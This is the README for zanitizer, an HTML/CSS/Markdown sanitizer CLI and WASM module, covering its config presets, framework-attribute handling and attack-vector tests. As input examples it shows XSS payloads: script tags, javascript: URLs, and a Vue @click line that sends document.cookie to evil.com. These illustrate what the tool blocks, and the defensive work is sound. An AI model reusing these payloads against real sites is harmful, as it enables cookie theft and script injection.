# Zanitizer (`zan`)

![Zig support](https://img.shields.io/badge/Zig-0.15.2-color?logo=zig&color=%23f3ab20)


`zanitizer` is a fast self-contained HTML+CSS+Markdown sanitizer built for backend rich-text processing, available as a composable CLI or a Node.js WASM module.
Built on top of `lexbor` for building the DOM.

<p align="center">
<img src="https://github.com/ndrean/zanitizer/blob/main/images/GGI_zanitizer.png" alt="Gemini Generated Image" width="700" height="700" />
</p>

<br>

It performs the sanitization in context, meaning  DOM and CSS aware, so retains the structure (_not regex-based_).

It combines a fast Markdown-to-safe-HTML pipeline.

It follows the `SanitizerConfig` API with presets and per-element attribute control.

This tool can be used:

- as a WASM module (700kB) (`Node` and browser).
- or as a composable, embeddable CLI (1.4MB unzipped)

**Speed test**:

| Test                 | Zaniter (WASM) | JSDOM+DOMPurify |
| -------------------- | ---------      | --------------- |
| [DOMPurify 84kB HTML](https://github.com/ndrean/zanitizer/blob/main/src/tests/input/dirty.html)  |  1.1ms         | 16ms            |
| [H5SC 24kB HTML ](https://github.com/ndrean/zanitizer/blob/main/src/tests/input/h5sc-test.html)      |  10ms          | 72ms            |

---

## Installation

**WASM module (Node/browser)**: from the `npm` repository.

```sh
npm install zanitize
```

Add `"type": "module"` to _package.json_ .

**CLI (OSX, Linux)**: using `brew`

```sh
brew tap ndrean/zanitizer
brew install zanitize
```

## Quick start

- Using the composable CLI:

```sh
echo "<script>alert(1)</script><p>Hello</p>" | zan -
# => <html><head></head><body><p>Hello</p></body></html>

# Fragment mode — body content only, ready for innerHTML:
echo "<script>alert(1)</script><p>Hello</p>" | zan - -f
# => <p>Hello</p>

# File input, write output to file:
zan dirty.html -o clean.html
```

- Using the WASM module:

```js
import { loadZanitize } from 'zanitize';

const zan = await loadZanitize(
  new URL('./node_modules/zanitize/zanitize.wasm', import.meta.url)
);
zan.init();

// Full document output:
console.log(zan.sanitize('<script>alert(1)</script><p>ok</p>'));
// => <html><head></head><body><p>ok</p></body></html>

// Fragment mode — body content only, ready for innerHTML:
console.log(zan.sanitizeFragment('<script>alert(1)</script><p>ok</p>'));
// => <p>ok</p>
```

### Example: Sanitize HTML and CSS

`<style>` elements and inline styles are sanitized in one pass — `javascript:` in `url()`, external HTTP URLs, and dangerous properties are stripped; safe CSS is kept intact.

Given _test.html_:

```html
<html>
  <head>
    <style>
      body { margin: 10px; padding: 5px; background: url(javascript:alert("xss")); }
      .trusted { color: green; }
      .untrusted { color: red; background-image: url("evil.com"); }
    </style>
  </head>
  <body>
    <div class="untrusted" onclick='alert(1)' style='font-size: 16px'>
      red color | onclick removed
    </div>
    <p class="untrusted" style='font-size: 12px'>
      red | bg-image threat stripped
    </p>
    <p class="trusted" style='padding: 20px'>
      green | padding from inline
    </p>
  </body>
</html>
```

#### CLI

```sh
cat test.html | zan -
```

#### Node.js (WASM)

```js
import { loadZanitize } from 'zanitize';
import { readFileSync } from 'fs';

const zan = await loadZanitize(
  new URL('./node_modules/zanitize/zanitize.wasm', import.meta.url)
);
zan.init();
console.log(zan.sanitize(readFileSync('test.html', 'utf8')));
```

Both produce:

```html
<html>
  <head>
    <style>
      body { margin: 10px; padding: 5px }
      .trusted { color: green }
      .untrusted { color: red; background-image: url(evil.com) }
    </style>
  </head>
  <body>
    <div class="untrusted" style="font-size: 16px">
      red color | onclick removed
    </div>
    <p class="untrusted" style="font-size: 12px">
      red | bg-image threat stripped
    </p>
    <p class="trusted" style="padding: 20px">
      green | padding from inline
    </p>
  </body>
</html>
```

---

## SanitizerConfig

The config is a JSON subset of the [W3C Sanitizer API](https://wicg.github.io/sanitizer-api/).
It is accepted by the CLI (`--config`) and the WASM module (`zan.init(config = {})`).

### Presets

| Preset | Script | Style | Comments | data-* | Custom elements | Strict URIs | DOM clobbering |
|--------|--------|-------|----------|--------|-----------------|-------------|----------------|
| **default** | removed | sanitized | stripped | kept | allowed | no | protected |
| **strict** | removed | sanitized | stripped | stripped | blocked | yes | protected |
| **permissive** | removed | sanitized | kept | kept | allowed | no | protected |
| **trusted** ⚠️ | kept | kept | kept | kept | allowed | no | off |

```sh
# CLI
./zig-out/bin/zan dirty.html --preset strict
./zig-out/bin/zan dirty.html --preset permissive
```

```js
// WASM
zan.init('{"strictUriValidation": true}');          // inline override
zan.init();                                          // default preset
```

<details><summary>**Field reference**</summary>

```js
{
  // Element allowlist — only these elements survive (others are unwrapped, children kept).
  // Cannot combine with removeElements.
  // Note: <html>, <head>, <body> are always preserved regardless of this list.
  "elements": [
    { "name": "p" },
    { "name": "a", "attributes": ["href", "title"] },
    { "name": "div", "removeAttributes": ["onclick"] }
  ],

  // Element blocklist — these elements and their content are removed entirely.
  // Cannot combine with elements.
  "removeElements": ["script", "iframe", "object"],

  // Unwrap these elements — element tag removed but children preserved.
  "replaceWithChildrenElements": ["b", "i", "span"],

  // Global attribute allowlist — only these attributes survive on all elements.
  // Cannot combine with removeAttributes.
  "attributes": ["class", "id", "href", "src"],

  // Global attribute blocklist — these attributes are stripped.
  // Cannot combine with attributes.
  "removeAttributes": ["onclick", "onerror"],

  "comments": false,           // keep HTML comments (default: false)
  "dataAttributes": true,      // allow data-* attributes (default: true)
  "allowCustomElements": true, // allow <my-element> custom tags (default: true)

  // Strict URI validation: only http:, https:, mailto: in href/src/action.
  // Also blocks external URLs in CSS url() (default: false)
  "strictUriValidation": false,

  // Strip id/name values that shadow DOM globals like createElement, location, cookie.
  // Prevents DOM clobbering attacks (default: true)
  "sanitizeDomClobbering": true,

  // Sanitize inline style="" attributes with a CSS property/value scanner.
  // Blocks expression(), dangerous url(), javascript: etc. (default: true)
  "sanitizeInlineStyles": true,

  // ⚠️ DANGER: bypass all safety checks — only for your own trusted templates.
  "bypassSafety": false
}
```

</details>

**Rules and constraints**:

- elements and removeElements are mutually exclusive.
- attributes and removeAttributes are mutually exclusive.
- Per-element attributes/removeAttributes in elements[] take priority over global attribute filters.
- Elements not in an elements allowlist are unwrapped (children kept) — use removeElements to drop content entirely.
- External HTTP/HTTPS URLs in CSS url() are blocked by default; relative paths (url(/image.png)) are always allowed.

**Examples**:

- Remove specific elements:

```sh
echo '<b>bold</b><script>evil()</script><p>ok</p>' \
  | ./zig-out/bin/zan - --config '{"removeElements":["b","script"]}'
# => <html><head></head><body><p>ok</p></body></html>
```

- Allowlist only <p> and <a>, with specific attributes:

```sh
echo '<div class="x"><p id="y"><a href="/ok" onclick="bad()">link</a></p></div>' \
  | ./zig-out/bin/zan - --config '{
      "elements": [
        {"name":"p","attributes":["id"]},
        {"name":"a","attributes":["href"]}
      ]
    }'
# <div> unwrapped, onclick stripped
# => <html><head></head><body><p id="y"><a href="/ok">link</a></p></body></html>
```

- WASM with custom config:

```js
zan.init(JSON.stringify({
  removeElements: ['script', 'iframe'],
  removeAttributes: ['onclick', 'onerror'],
  comments: false,
  sanitizeDomClobbering: true,
}));
const clean = zan.sanitizeFragment(userHtml);
```

---

## Framework Attributes

**All non-standard attributes are stripped by default.** The sanitizer only passes attributes it recognises from the HTML spec. Framework attributes (`wire:model`, `data-turbo-frame`, `x-data`, `hx-get`…) are unknown to the spec and are therefore removed unless you explicitly opt in.

### Why block framework attributes by default?

This protects against **Client-Side Template Injection (CSTI)**.

A framework attribute is inert HTML from the browser's point of view, but it is executable code from the framework's point of view. Consider a blog that lets users post comments and sanitizes them with Zanitizer before storing — and the blog happens to be built with Vue or Alpine. An attacker posts:

```html
<span @click="fetch('https://evil.com/?c='+document.cookie)">click me</span>
```

The browser renders a harmless `<span>`. The sanitizer has no way to know whether the page uses Vue. But when Vue boots, it scans the DOM, finds `@click`, compiles it, and executes the payload on the next click. The attacker has achieved script execution without a `<script>` tag.

The same attack surface exists for every framework event handler: `x-on:*`, `wire:click`, `phx-click`, `v-on:*`, `(click)`, `on:*`, etc.

Stripping framework attributes by default is therefore the only safe posture when sanitizing **user-generated content**. `--allow-attr-prefix` / `customAttrPrefixes` is for **developer-controlled data** — you opt in for the specific prefixes your app uses, and the sanitizer still blocks protocol injection on their values.

For your own trusted templates that legitimately contain event handlers, use `"bypassSafety": true`.

### `--allow-attr-prefix` (CLI, repeatable)

```sh
# Livewire
echo '<div wire:model="name" wire:navigate>ok</div>' \
  | zan --allow-attr-prefix wire:
# => <div wire:model="name" wire:navigate="">ok</div>

# Multiple frameworks at once
echo '<div data-turbo-frame="main" stimulus-controller="my">ok</div>' \
  | zan --allow-attr-prefix data-turbo --allow-attr-prefix stimulus-

# Protocol injection is always blocked even on allowed prefixes
echo '<div wire:click="javascript:alert(1)">bad</div>' \
  | zan --allow-attr-prefix wire:
# => <div>bad</div>   (wire:click stripped, wire:model would be kept)
```

### `customAttrPrefixes` (JSON config / WASM)

```sh
zan --config '{"customAttrPrefixes":["wire:","livewire:","data-turbo"]}' dirty.html
```

```js
// WASM
zan.init(JSON.stringify({ customAttrPrefixes: ['wire:', 'livewire:', 'data-turbo'] }));
const clean = zan.sanitizeFragment(userHtml);
```

### Security model

Allowed-prefix attributes go through **protocol-only** value checking. The sanitizer blocks:

- `javascript:` — always dangerous
- `vbscript:` — always dangerous
- `data:text/html` — HTML injection via data URI
- `data:text/javascript` — JS injection via data URI

JS code-pattern scanning (`eval(`, `import(`, etc.) is **intentionally skipped** for these attributes. Framework attribute values can be URLs, CSS selectors, Alpine expressions, or Livewire component props — the sanitizer cannot distinguish them without framework-specific knowledge. Protocol injection is the unambiguous structural threat.

> If you need to strip JS expressions from framework values, pre-process the data server-side before passing it to the sanitizer.

---

## Using Markdown input

We use the library [md4c](https://github.com/mity/md4c) with `MD_DIALECT_GITHUB` — tables, strikethrough, task lists, and autolinks are all enabled.

> Usage: just add the flag `--md`.

An example:

```sh
echo "# Hello from Markdown

This is **GFM** rendered natively via md4c.

| Column A | Column B |
|----------|----------|
| foo      | bar      |
| baz      | qux      |

- [x] md4c parses GFM tables and task lists
- [x] lexbor renders the resulting HTML
- [ ] profit

~~Strikethrough~~, https://example.com autolink, and <span style=\"color:red\">raw HTML</span> all work." \
| ./zig-out/bin/zan - --md
```

gives:

```html
<html>
  <head></head>
  <body>
    <h1>Hello from Markdown</h1>
    <p>This is <strong>GFM</strong> rendered natively via md4c.</p>
    <table>
      <thead><tr><th>Column A</th><th>Column B</th></tr></thead>
      <tbody>
        <tr><td>foo</td><td>bar</td></tr>
        <tr><td>baz</td><td>qux</td></tr>
      </tbody>
    </table>
    <ul>
      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="" checked=""> md4c parses GFM tables and task lists</li>
      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="" checked=""> lexbor renders the resulting HTML</li>
      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled=""> profit</li>
    </ul>
    <p><del>Strikethrough</del>, <a href="https://example.com">https://example.com</a> autolink, and <span style="color: red">raw HTML</span> all work.</p>
  </body>
</html>
```

---

## Tests

The sanitizer walks the DOM and applies [html_spec rules](https://github.com/ndrean/zanitizer/blob/main/src/modules/html_specs.zig) — marking nodes and attributes for removal or update, then applying all changes in one pass after the walk completes.

Settings cover: comments, `<script>`/`<style>` handling, custom elements, data-* attributes, URI validation, DOM clobbering protection, and inline CSS sanitization. Preset modes are provided but every field is overridable per run.

### Speed tests

Sanitize a 84kB HTML: <https://github.com/ndrean/zanitizer/blob/main/src/tests/input/dirty.html>


`node src/tests/jsdom/dompurify-jsdom-html-speed.js`: 16.5ms
`node src/tests/wasm/dompurify-html-speed.js`: 1.1ms

Sanitize a 24kB HTML: <https://github.com/ndrean/zanitizer/blob/main/src/tests/input/h5sc-test.html>

`node src/tests/jsdom/h5sc-dompurify-jsdom.js`: 71ms
`node src/tests/wasm/h5sc-speed-test.js`: 10.1ms

### Quality tests

#### Zig unit tests

```sh
zig build test --summary all
# 138 tests passed
```

Quick smoke test: `bash src/tests/smoke.sh`



#### WASM vector tests (Node.js)

Tests 228 real-world attack vectors from OWASP, PortSwigger, and DOMPurify against the WASM module:

```sh
node tests/run_wasm_vectors.mjs
# ALL PASS  228/228 tests passed

# Filter by suite
node tests/run_wasm_vectors.mjs --suite PORTSWIGGER_EVENT_HANDLERS

# Filter by keyword
node tests/run_wasm_vectors.mjs --filter "onerror"
```

Suites covered:

| Suite | Cases |
| --- | --- |
| OWASP XSS Filter Evasion | 70 |
| OWASP XSS Prevention | 6 |
| OWASP DOM Clobbering | 5 |
| DOMPurify-derived | 14 |
| OWASP Encoding Bypasses | 23 |
| PortSwigger Event Handlers | 79 |
| CSS Injection Vectors | 11 |
| HTML5 Security Vectors | 20 |

The vector source is _tests/input/owasp_vectors.json_, extracted from _src/modules/sanitizer_test_vectors.zig_:

```sh
node tests/extract_zig_vectors.mjs   # regenerate JSON from Zig source
```

## Tips

We can use `"bypassSafety" to check how strings are parsed by Lexbor, and then evaluate the same with sanitizer 'on'.

```sh
node -e "
import('./node_modules/zanitize/zanitize.js').then(async ({loadZanitize}) => {
  const zan = await loadZanitize(new URL('./node_modules/zanitize/zanitize.wasm', import.meta.url));
  zan.init('{\"bypassSafety\": true}');  // skip sanitize to see what Lexbor serializes
  const variants = [
    'url(http://evil.com/)',         // unquoted
    'url(\"http://evil.com/\")',      // double-quoted
    \"url('http://evil.com/')\",      // single-quoted
  ];
  for (const v of variants) {
    const out = zan.sanitizeFragment('<div style=\"background: ' + v + '\">x</div>');
    console.log('input:', v);
    console.log('out  :', out, '\n');
  }
})"
```

```txt
input: url(http://evil.com/)
out  : <div>x</div>

input: url("http://evil.com/")
out  : <div>x</div>

input: url('http://evil.com/')
out  : <div style="background: url(&quot;http://evil.com/&quot;)">x</div>
```

## Security Policy

[SECURITY.md](https://github.com/ndrean/zanitizer/blob/main/SECURITY.md)

## Reporting Vulnerabilities

If you discover a sanitizer bypass, please report it responsibly. Open an issue or contact the maintainers directly. Include:

1. The input HTML/CSS payload
2. The sanitizer mode and options used
3. What dangerous content survives sanitization

## Licenses

This software uses heavily [lexbor](https://lexbor.com)

- `lexbor` [License Apache 2.0](https://github.com/lexbor/lexbor/blob/master/LICENSE)
- `md4c` [License MIT](https://github.com/mity/md4c/blob/master/LICENSE.md)

